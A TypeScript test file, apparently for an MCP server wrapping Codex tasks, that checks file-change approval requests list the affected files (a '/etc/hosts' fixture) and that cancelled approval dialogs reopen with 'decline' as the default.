test("file lists follow item/fileChange/patchUpdated", async () => {
  const started = { method: "item/started", params: { threadId: THREAD_ID, turnId: TURN_ID, item: { type: "fileChange", id: "fc9", status: "inProgress", changes: [] } } };
  const patched = { method: "item/fileChange/patchUpdated", params: { threadId: THREAD_ID, turnId: TURN_ID, itemId: "fc9", changes: [{ path: "/etc/hosts", kind: { type: "update", move_path: null }, diff: "" }] } };
  const fileReq: Msg = { id: "pu", method: FILE_CHANGE_APPROVAL, params: { threadId: THREAD_ID, turnId: TURN_ID, itemId: "fc9", startedAtMs: 0 } };
  const peer = new ApprovalPeer([fileReq], [started, patched]);
  const h = handler({ createTransport: () => peer });
  const s = await call(h, "codex_task_start", { prompt: "x", cwd: tmp() });
  const w = await call(h, "codex_task_wait", { job_id: s.job_id, max_wait_s: 5 });
  assert.deepEqual(w.pending_approvals[0].request.files, [{ path: "/etc/hosts", change: "update" }]);
  await call(h, "codex_task_cancel", { job_id: s.job_id });
  await until(h, s.job_id, ["cancelled", "failed"]);
});

test("cancelling the waiting tool call closes its dialog, and the next wait opens it again; Decline is the default", async () => {
  const peer = new ApprovalPeer([commandRequest("k1")]);
  const forms: Any[] = [];
  let calls = 0;
  const { server } = buildServer({ versionProbe: okProbe, capabilityProbe: caps, wallMs: 5_000, env: {}, createTransport: () => peer });
  const [ct, st] = InMemoryTransport.createLinkedPair();
  await server.connect(st);
  const client = new Client({ name: "approvals-test", version: "0" }, { capabilities: { elicitation: { form: {} } } });
  client.setRequestHandler(ElicitRequestSchema, async (req, extra) => {
    forms.push((req.params as Any).requestedSchema);
    if (++calls === 1) {
      // The first dialog stays open until the tool call is cancelled.
      await new Promise<void>((r) => extra.signal.addEventListener("abort", () => r(), { once: true }));
      return { action: "cancel" };
    }
    return { action: "accept", content: { decision: "accept" } };
  });
  await client.connect(ct);
  const s = (await client.callTool({ name: "codex_task_start", arguments: { prompt: "x", cwd: tmp() } })).structuredContent as Any;
  const abort = new AbortController();
  const first = client.callTool({ name: "codex_task_wait", arguments: { job_id: s.job_id, max_wait_s: 5 } }, undefined, { signal: abort.signal });
  for (let i = 0; i < 200 && calls === 0; i++) await sleep(5);
  abort.abort();
  await assert.rejects(first);
  await sleep(20);
  let w = (await client.callTool({ name: "codex_task_wait", arguments: { job_id: s.job_id, max_wait_s: 5 } })).structuredContent as Any;
  for (let i = 0; i < 20 && w.state !== "succeeded"; i++) w = (await client.callTool({ name: "codex_task_wait", arguments: { job_id: s.job_id, max_wait_s: 5 } })).structuredContent as Any;
  assert.equal(calls, 2, "the dialog was opened again");
  assert.equal(w.state, "succeeded");
  assert.equal(forms[0]!.properties.decision.default, "decline");
  assert.equal(forms[0]!.properties.decision.oneOf[0].const, "decline");
  await client.close();
});
